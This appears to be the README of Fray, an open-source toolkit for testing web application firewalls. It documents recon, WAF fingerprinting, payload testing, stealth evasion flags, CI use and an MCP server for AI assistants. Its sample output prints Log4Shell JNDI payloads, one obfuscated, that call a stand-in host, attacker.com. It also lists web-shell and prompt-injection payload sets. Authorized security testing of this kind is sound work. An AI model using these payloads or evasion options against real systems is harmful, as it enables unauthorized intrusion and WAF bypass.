# Fray

**🌐 Language:** **English** | [日本語](README.ja.md)

### ⚔️ *Open-source WAF security testing toolkit — recon, detect, test, report*

[![Total Payloads](https://img.shields.io/badge/Payloads-5500+-brightgreen.svg?style=for-the-badge)](https://github.com/dalisecurity/fray)
[![WAF Detection](https://img.shields.io/badge/WAF_Vendors-25+-blue.svg?style=for-the-badge&logo=cloudflare)](https://github.com/dalisecurity/fray)
[![Recon Checks](https://img.shields.io/badge/Recon_Checks-14-orange.svg?style=for-the-badge)](https://github.com/dalisecurity/fray)
[![OWASP Coverage](https://img.shields.io/badge/OWASP-100%25-success.svg?style=for-the-badge&logo=owasp)](https://github.com/dalisecurity/fray)

[![PyPI](https://img.shields.io/pypi/v/fray.svg)](https://pypi.org/project/fray/)
[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![GitHub stars](https://img.shields.io/github/stars/dalisecurity/fray?style=social)](https://github.com/dalisecurity/fray/stargazers)

> ⚠️ **FOR AUTHORIZED SECURITY TESTING ONLY** — Only test systems you own or have explicit written permission to test.

---

## Why Fray?

Most payload collections are static text files. Fray is a **complete workflow** — recon → detect → test → report:

- 🔍 **Recon first** — 14 checks: TLS, headers, cookies, DNS, CORS, exposed files, subdomains
- 🎯 **Smart testing** — detects WordPress, recommends sqli + xss payloads. You pick Y/N
- 🛡️ **WAF detection** — fingerprints 25 vendors (Cloudflare, AWS, Akamai, Imperva, etc.)
- 🐛 **HackerOne ready** — structured JSON output maps to HackerOne severity/weakness taxonomy
- 🤖 **AI-native** — MCP server for Claude Code & ChatGPT integration
- 📊 **One-command reports** — HTML & Markdown with vulnerability analysis
- ⚡ **Zero dependencies** — pure Python stdlib, `pip install fray` and go

| OWASP Framework | Payloads | Coverage |
|----------------|----------|----------|
| **Web Top 10:2021** | 1,690+ | ✅ 100% |
| **Mobile Top 10:2024** | 575+ | ✅ 100% |
| **LLM Top 10** (AI/ML) | 300+ | ✅ 100% |
| **API Security Top 10** | 520+ | ✅ 100% |

**Built for:** Bug bounty hunters · Red teamers & pentesters · Security researchers · Blue teams validating WAF configs · Students learning offensive security

---

## Quick Start

```bash
pip install fray
```

```bash
# 1. Recon — know your target before testing
fray recon https://example.com

# 2. Smart mode — recon + pick payloads interactively
fray test https://example.com --smart

# 3. Detect WAF vendor
fray detect https://example.com

# 4. Test specific category
fray test https://example.com -c xss --max 10

# 5. Explain a CVE — payloads, severity, what to test
fray explain CVE-2021-44228

# 6. Generate report
fray report -i results.json -o report.html
```

---

## 🔍 Reconnaissance — `fray recon`

14 automated checks in a single command:

```bash
fray recon https://example.com
```

| Check | What It Finds |
|-------|---------------|
| **TLS** | Version, cipher, cert expiry, TLS 1.0/1.1 |
| **Security Headers** | HSTS, CSP, X-Frame-Options + 6 more (scored) |
| **Cookies** | HttpOnly, Secure, SameSite flags (scored) |
| **Fingerprinting** | WordPress, Drupal, PHP, Node.js, React, nginx, Apache, Java, .NET + more |
| **DNS** | A/AAAA/CNAME/MX/TXT/NS, CDN detection, SPF/DMARC |
| **robots.txt** | Disallowed paths, interesting endpoints (admin, api, login) |
| **CORS** | Wildcard origin, reflected origin, credentials misconfig |
| **Exposed Files** | 28 probes — `.env`, `.git`, phpinfo, actuator, SQL dumps |
| **HTTP Methods** | Dangerous methods: PUT, DELETE, TRACE |
| **Error Page** | Stack traces, version leaks, framework hints from 404 |
| **Subdomains** | crt.sh certificate transparency enumeration |

```bash
fray recon https://example.com --json       # Raw JSON
fray recon https://example.com -o recon.json # Save to file
```

> 📖 For more details, see [docs/quickstart.md](docs/quickstart.md)

---

## 🎯 Smart Mode — `fray test --smart`

Recon runs first, then recommends payloads based on what it finds:

```
🔍 Running reconnaissance on https://example.com...

───────────────────────────────────────────────────
  Target:  https://example.com
  TLS:     TLSv1.3
  Headers: 67%
  Stack:   wordpress (100%), nginx (70%)
───────────────────────────────────────────────────

  Recommended categories (based on detected stack):

    1. sqli                      (1200 payloads)
    2. xss                       (800 payloads)
    3. path_traversal            (400 payloads)

    Total: 2400 payloads (vs 5500 if all categories)

  [Y] Run recommended  [A] Run all  [N] Cancel  [1,3] Pick:
```

| Input | Action |
|-------|--------|
| **Y** | Run recommended categories |
| **A** | Run all categories |
| **N** | Cancel |
| **1,3** | Pick specific categories |

```bash
fray test https://example.com --smart -y    # Auto-accept (CI/scripts)
```

**Tech → Payload mapping:**

| Detected | Priority Payloads |
|----------|-------------------|
| WordPress | sqli, xss, path_traversal, command_injection, ssrf |
| Drupal | sqli, ssti, xss, command_injection |
| PHP | sqli, path_traversal, command_injection, file_upload |
| Node.js | ssti, ssrf, xss, command_injection |
| Java | ssti, xxe, sqli, command_injection |
| .NET | sqli, path_traversal, xxe, command_injection |

> 📖 See full OWASP coverage at [docs/owasp-complete-coverage.md](docs/owasp-complete-coverage.md)

---

## 🛡️ WAF Detection — 25 Vendors

```bash
fray detect https://example.com
```

Detects: **Cloudflare, AWS WAF, Akamai, Imperva, F5 BIG-IP, Fastly, Azure WAF, Google Cloud Armor, Sucuri, Fortinet, Wallarm, Vercel** and 13 more.

[Full vendor table + detection signatures →](docs/waf-detection-guide.md) · [WAF research →](docs/waf-detection-research.md)

---

## � Authenticated Scanning

Most real bugs live behind login walls. Fray supports authenticated scanning across all commands:

```bash
# Cookie-based auth
fray recon https://app.example.com --cookie "session=abc123; csrf=xyz"
fray test https://app.example.com -c xss --cookie "session=abc123"

# Bearer token (JWT, API keys)
fray test https://api.example.com -c sqli --bearer "eyJhbGciOiJIUzI1NiJ9..."

# Custom headers (repeatable -H)
fray recon https://app.example.com -H "X-API-Key: secret" -H "X-Tenant: acme"

# Form login flow — POST creds, capture session, then scan
fray test https://app.example.com -c xss \
  --login-flow "https://app.example.com/login,username=admin,password=secret"

# Combine: login + scope + smart mode
fray test https://app.example.com --smart --scope scope.txt \
  --login-flow "https://app.example.com/login,email=user@test.com,password=pass123"
```

| Flag | Works With | Description |
|------|-----------|-------------|
| `--cookie` | recon, detect, test | Session cookie string |
| `--bearer` | recon, detect, test | Bearer/JWT token |
| `-H` / `--header` | recon, detect, test | Any custom header (repeatable) |
| `--login-flow` | recon, detect, test | POST form login → auto-capture session cookies |

---

## 🥷 Rate Limiting & Stealth Mode

Real pentesters get blocked constantly. Fray has built-in evasion:

```bash
# Add random jitter (0–2s) on top of the base delay
fray test https://target.com -c xss --delay 1 --jitter 2

# Cap requests per second (e.g. max 2 req/s)
fray test https://target.com -c sqli --rate-limit 2

# Stealth mode — one flag, full evasion:
#   • Randomized User-Agent (Chrome/Firefox/Safari/Edge/Mobile)
#   • Randomized Accept-Language
#   • Auto jitter (1s) + throttle (max 2 req/s)
fray test https://target.com --smart --stealth

# Combine everything for authorized engagements
fray test https://target.com --stealth --scope scope.txt \
  --cookie "session=abc" --delay 2 --jitter 3 --rate-limit 1
```

| Flag | Default | Description |
|------|---------|-------------|
| `--delay` | 0.5s | Fixed delay between requests |
| `--jitter` | 0 | Random variance added to delay (0 to N seconds) |
| `--rate-limit` | 0 (unlimited) | Max requests per second |
| `--stealth` | off | Enables UA rotation, jitter (1s), throttle (2 req/s) |

`--stealth` sets sane defaults but respects your overrides — if you pass `--delay 5 --jitter 3`, those values are used instead.

---

## ⚡ GitHub Actions — CI/CD Integration

Test your WAF on every PR with one line:

```yaml
# .github/workflows/waf-test.yml
name: WAF Security Test
on: [pull_request]
permissions:
  pull-requests: write

jobs:
  waf-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dalisecurity/fray@v1
        with:
          target: ${{ secrets.FRAY_TARGET_URL }}
          mode: smart
          fail-on-bypass: 'true'
```

### Full Options

```yaml
- uses: dalisecurity/fray@v1
  with:
    target: 'https://staging.example.com'
    mode: smart              # smart | all | xss | sqli | ssrf ...
    max-payloads: '50'       # payloads per category
    stealth: 'true'          # UA rotation + jitter + throttle
    cookie: ${{ secrets.SESSION_COOKIE }}
    bearer: ${{ secrets.API_TOKEN }}
    scope-file: 'scope.txt'  # only test in-scope targets
    fail-on-bypass: 'true'   # fail CI if WAF is bypassed
    comment-on-pr: 'true'    # post results table on PR
    webhook: ${{ secrets.SLACK_WEBHOOK }}
```

### What It Does

1. **Installs Fray** from PyPI
2. **Detects WAF** vendor (Cloudflare, AWS WAF, etc.)
3. **Runs payload tests** (smart mode or specific category)
4. **Uploads results** as build artifact
5. **Comments on PR** with results table (blocked/bypassed/rate)
6. **Fails CI** if any payload bypasses the WAF (optional)

### Action Outputs

```yaml
steps:
  - uses: dalisecurity/fray@v1
    id: fray
    with:
      target: ${{ secrets.TARGET }}
  - run: |
      echo "Blocked: ${{ steps.fray.outputs.blocked }}"
      echo "Bypassed: ${{ steps.fray.outputs.bypassed }}"
      echo "Rate: ${{ steps.fray.outputs.block-rate }}"
      echo "WAF: ${{ steps.fray.outputs.waf-vendor }}"
```

### Generate Workflow from CLI

```bash
fray ci init                                    # create .github/workflows/fray-waf-test.yml
fray ci init --target https://staging.example.com  # with hardcoded target
fray ci show --minimal                          # print minimal workflow to stdout
```

---

## 🐛 Bug Bounty Integration

Fray is built for bug bounty workflows — from recon to report submission:

### HackerOne

Fray's JSON output aligns with HackerOne's vulnerability taxonomy:

```bash
# Full workflow: recon → smart test → report
fray recon https://target.hackerone.com -o recon.json
fray test https://target.hackerone.com --smart -y -o results.json
fray report -i results.json -o report.html --format markdown
```

- **Recon findings** map to HackerOne weakness types (Misconfiguration, Information Disclosure, etc.)
- **Exposed files** → Information Disclosure findings
- **Missing headers / cookie flags** → Security Misconfiguration
- **CORS misconfig** → CORS Misconfiguration weakness
- **Markdown reports** paste directly into HackerOne report fields

### Supported Platforms

| Platform | How Fray Helps |
|----------|---------------|
| **HackerOne** | Structured findings, markdown reports, weakness taxonomy alignment |
| **Bugcrowd** | JSON output feeds into submission templates |
| **Intigriti** | Recon → test → report workflow |
| **YesWeHack** | Severity mapping from recon scores |

### Scope File Support

Bounty hunters always have scope files. Fray reads them natively:

```bash
# scope.txt (Burp-style)
example.com
*.example.com
10.0.0.0/24
https://app.example.com/api
- staging.example.com    # excluded
! internal.example.com   # excluded
```

```bash
# Inspect a scope file
fray scope scope.txt

# Check if a target is in scope
fray scope scope.txt --check https://sub.example.com

# Test with scope enforcement — blocks out-of-scope targets
fray test https://target.com --smart --scope scope.txt
```

Supports: **domains, wildcards (\*.example.com), IPs, CIDRs, URLs, out-of-scope exclusions**

### Workflow Example

```
1. fray scope scope.txt                           → Review your scope
2. fray recon https://target.com                  → Discover attack surface
3. fray detect https://target.com                 → Know which WAF you're facing
4. fray test https://target.com --smart --scope scope.txt  → Test (scope-enforced)
5. fray report -i results.json                    → Generate submission-ready report
```

---

## 🤖 MCP Server — AI Integration

```bash
pip install fray[mcp]
fray mcp
```

Add to Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "fray": { "command": "python", "args": ["-m", "fray.mcp_server"] }
  }
}
```

**6 tools:** `list_payload_categories`, `get_payloads`, `search_payloads`, `get_waf_signatures`, `get_cve_details`, `suggest_payloads_for_waf`

Ask Claude: *"What XSS payloads bypass Cloudflare?"* → it calls the MCP tools directly.

### Example: CVE Lookup

```
You:    "Does Fray cover React2Shell?"
Claude:  → calls get_cve_details("react2shell")
         → "Yes — 5 payloads in xss/cve_2025_real_world.json
            including React Server Components RCE (CVSS 10.0, CISA KEV)"

You:    "Show me Log4Shell payloads"
Claude:  → calls search_payloads("log4shell")
         → returns 15 payloads with JNDI injection variants

You:    "What payloads work against AWS WAF?"
Claude:  → calls suggest_payloads_for_waf("aws")
         → returns prioritized bypass payloads for AWS WAF
```

[Claude Code guide →](docs/claude-code-guide.md) · [ChatGPT guide →](docs/chatgpt-guide.md)

---

## 📊 Reports

```bash
fray report --sample                           # Demo report
fray report -i results.json -o report.html     # HTML report
fray report -i results.json --format markdown  # Markdown report
```

![Fray Sample Report](docs/sample-report.png)

[Report guide →](docs/report-guide.md) · [POC simulation guide →](docs/poc-simulation-guide.md)

---

## 📦 5,500+ Payloads

```bash
fray payloads  # List all categories
```

| Category | Payloads | Category | Payloads |
|----------|----------|----------|----------|
| XSS | 867 | SSRF | 167 |
| SQLi | 456 | SSTI | 98 |
| Command Injection | 234 | XXE | 123 |
| Path Traversal | 189 | File Upload | 70+ |
| AI/LLM Prompt Injection | 370 | Web Shells | 160+ |
| OWASP Mobile | 575+ | CVE Exploits | 220 |

Includes **120 real-world CVEs** (2020–2026): Log4Shell, Spring4Shell, ProxyShell, React2Shell, and more.

### `fray explain` — CVE Intelligence

```bash
fray explain CVE-2021-44228        # by CVE ID
fray explain log4shell              # by name
fray explain react2shell --max 10   # show more payloads
fray explain spring4shell --json    # JSON output
```

```
Fray Explain — CVE Intelligence
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  CVE-2021-44228
  Log4Shell - Log4j RCE

  Severity:     CRITICAL (CVSS 10.0)
  Affected:     Log4j 2.0-beta9 to 2.14.1
  Disclosed:    2021-12-09
  Payloads:     2 available

  #1 ${jndi:ldap://attacker.com/exploit}
  #2 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}

  What to test:
    → Test command execution endpoints, check input sanitization
    → fray test <url> -c xss --max 10
```

[Full payload database →](docs/payload-database-coverage.md) · [CVE coverage →](docs/cve-real-world-bypasses.md) · [AI security →](docs/ai-security-guide.md) · [Mobile security →](docs/owasp-mobile-top10.md) · [API security →](docs/owasp-api-security.md)

---

## 🏗️ Project Structure

```
fray/
├── fray/
│   ├── cli.py              # CLI entry point
│   ├── recon.py             # 14-check reconnaissance engine
│   ├── detector.py          # WAF detection (25 vendors)
│   ├── tester.py            # Payload testing engine
│   ├── evolve.py            # Adaptive payload evolution
│   ├── reporter.py          # HTML + Markdown reports
│   ├── mcp_server.py        # MCP server for AI assistants
│   └── payloads/            # 5,500+ payloads (22 categories)
├── tests/                   # 330 tests
├── docs/                    # 28 guides
└── pyproject.toml           # pip install fray
```

---

## 📈 Roadmap

**Done:**
- [x] 14-check reconnaissance (`fray recon`)
- [x] Smart payload selection with interactive prompt (`--smart`)
- [x] Cookie, CORS, exposed file, DNS, subdomain scanning
- [x] Adaptive payload evolution
- [x] HTML + Markdown report generation
- [x] MCP server for AI integration

**Next:**
- [ ] Shareable report URLs (hosted HTML, temporary links)
- [ ] HackerOne API integration (auto-submit findings)
- [ ] Web-based report dashboard
- [ ] ML-based payload effectiveness scoring
- [ ] Multi-WAF comparison testing

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). We welcome payload contributions, tool improvements, and documentation PRs.

## Legal

**MIT License** — See [LICENSE](LICENSE). Only test systems you own or have explicit authorization to test. The authors are not responsible for misuse.

**Security issues:** soc@dalisec.io · [SECURITY.md](SECURITY.md)

---

**[📖 All Documentation (28 guides)](docs/) · [PyPI](https://pypi.org/project/fray/) · [Issues](https://github.com/dalisecurity/fray/issues) · [Discussions](https://github.com/dalisecurity/fray/discussions)**
